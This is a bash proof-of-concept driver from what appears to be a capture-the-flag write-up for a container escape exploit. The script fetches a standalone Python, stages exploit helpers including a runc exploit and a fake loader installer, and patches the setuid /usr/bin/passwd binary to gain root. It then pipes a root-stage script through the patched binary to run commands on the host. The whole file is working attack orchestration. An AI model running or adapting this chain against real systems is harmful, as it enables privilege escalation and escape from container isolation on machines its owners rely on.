#!/usr/bin/env bash
set -euo pipefail

# Copy this whole writeup directory to the CTF container and run:
#   ./poc.sh [host-command [args...]]

SRC_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
DCF_WORK="${DCF_WORK:-/tmp/copyfail-poc-$(id -u)}"
DCF_PYROOT="${DCF_PYROOT:-$DCF_WORK/pyroot}"
DCF_PY="${DCF_PY:-$DCF_PYROOT/bin/python3}"
DCF_SUIDBIN="${DCF_SUIDBIN:-/usr/bin/passwd}"
DCF_HEALTHBIN="${DCF_HEALTHBIN:-/bin/busybox}"
DCF_INTERVAL="${DCF_INTERVAL:-5}"
DCF_FAKE_LOADER_SLEEP="${DCF_FAKE_LOADER_SLEEP:-1}"
DCF_FAKE_LOADER_PATH="${DCF_FAKE_LOADER_PATH:-}"
DCF_HOST_CMD_TIMEOUT="${DCF_HOST_CMD_TIMEOUT:-240}"
export DCF_WORK DCF_PYROOT DCF_PY DCF_SUIDBIN
export DCF_HEALTHBIN DCF_INTERVAL DCF_FAKE_LOADER_SLEEP DCF_FAKE_LOADER_PATH DCF_HOST_CMD_TIMEOUT
export LD_LIBRARY_PATH="$DCF_PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export PYTHONDONTWRITEBYTECODE=1

HELPERS=(
    cf_passwd_bash.py
    copyfail_primitive.py
    cf_write.py
    cf_patch_fd_host.py
    exploit_runc.py
    install_fake_loader.py
    root_stage.sh
)

log() {
    printf '[+] %s\n' "$*"
}

die() {
    printf '[-] %s\n' "$*" >&2
    exit 1
}

fetch_url() {
    local url="$1"

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "$url"
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- "$url"
    else
        die "need curl or wget to download bootstrap artifacts"
    fi
}

download_file() {
    local url="$1"
    local out="$2"

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --retry 3 -o "$out" "$url"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$out" "$url"
    else
        die "need curl or wget to download bootstrap artifacts"
    fi
}

python_platform() {
    case "$(uname -m)" in
        x86_64|amd64) ;;
        *) die "unsupported architecture for bundled bootstrap: $(uname -m)" ;;
    esac

    if ls /lib/ld-musl-*.so.1 >/dev/null 2>&1; then
        printf 'x86_64-unknown-linux-musl'
    else
        printf 'x86_64-unknown-linux-gnu'
    fi
}

latest_python_url() {
    local platform api url

    platform="$(python_platform)"
    api="$(fetch_url https://api.github.com/repos/astral-sh/python-build-standalone/releases/latest)"
    url="$(
        printf '%s\n' "$api" |
            sed -n "s/.*\"browser_download_url\": \"\\([^\"]*cpython-3\\.12\\.[^\"]*-${platform}-install_only_stripped\\.tar\\.gz\\)\".*/\\1/p" |
            head -n 1
    )"

    if [[ -z "$url" ]]; then
        url="$(
            printf '%s\n' "$api" |
                sed -n "s/.*\"browser_download_url\": \"\\([^\"]*cpython-3\\.12\\.[^\"]*-${platform}-install_only\\.tar\\.gz\\)\".*/\\1/p" |
                head -n 1
        )"
    fi

    [[ -n "$url" ]] || die "could not find a standalone Python tarball for $platform"
    printf '%s\n' "$url"
}

bootstrap_pyroot() {
    if [[ -x "$DCF_PY" ]]; then
        return
    fi

    log "bootstrapping standalone Python in $DCF_PYROOT"
    mkdir -p "$DCF_WORK" "$DCF_PYROOT"

    local py_url py_tar extract_dir
    py_url="$(latest_python_url)"
    py_tar="$DCF_WORK/python-standalone.tar.gz"
    extract_dir="$DCF_WORK/python-standalone.extract"

    log "downloading $py_url"
    download_file "$py_url" "$py_tar" >/dev/null

    rm -rf "$DCF_PYROOT" "$extract_dir"
    mkdir -p "$DCF_PYROOT" "$extract_dir"
    tar -xzf "$py_tar" -C "$extract_dir"
    [[ -x "$extract_dir/python/bin/python3" ]] || die "unexpected Python tarball layout"
    mv "$extract_dir/python"/* "$DCF_PYROOT"/
    rm -rf "$extract_dir"

    [[ -x "$DCF_PY" ]] || die "failed to install Python under $DCF_PYROOT"
}

stage_files() {
    mkdir -p "$DCF_WORK"

    for helper in "${HELPERS[@]}"; do
        [[ -f "$SRC_DIR/$helper" ]] || die "missing helper file: $helper"
        cp "$SRC_DIR/$helper" "$DCF_WORK/$helper"
    done

    chmod 700 "$DCF_WORK"/*.py "$DCF_WORK/root_stage.sh"
}

run_root_stage() {
    if [[ "$(id -u)" == "0" ]]; then
        log "already root; running root stage directly"
        DCF_WORK="$DCF_WORK" DCF_PYROOT="$DCF_PYROOT" DCF_PY="$DCF_PY" /bin/bash "$DCF_WORK/root_stage.sh" "$@"
        return
    fi

    log "patching $DCF_SUIDBIN to get container root"
    "$DCF_PY" "$DCF_WORK/cf_passwd_bash.py" "$DCF_SUIDBIN"

    log "launching root stage through patched $DCF_SUIDBIN"
    {
        printf 'DCF_WORK=%q\n' "$DCF_WORK"
        printf 'DCF_PYROOT=%q\n' "$DCF_PYROOT"
        printf 'DCF_PY=%q\n' "$DCF_PY"
        printf 'DCF_SUIDBIN=%q\n' "$DCF_SUIDBIN"
        printf 'DCF_HEALTHBIN=%q\n' "$DCF_HEALTHBIN"
        printf 'DCF_INTERVAL=%q\n' "$DCF_INTERVAL"
        printf 'DCF_FAKE_LOADER_SLEEP=%q\n' "$DCF_FAKE_LOADER_SLEEP"
        printf 'DCF_FAKE_LOADER_PATH=%q\n' "$DCF_FAKE_LOADER_PATH"
        printf 'DCF_HOST_CMD_TIMEOUT=%q\n' "$DCF_HOST_CMD_TIMEOUT"
        printf 'set --'
        printf ' %q' "$@"
        printf '\n'
        cat "$DCF_WORK/root_stage.sh"
    } | "$DCF_SUIDBIN"
}

main() {
    bootstrap_pyroot
    stage_files
    run_root_stage "$@"
}

main "$@"
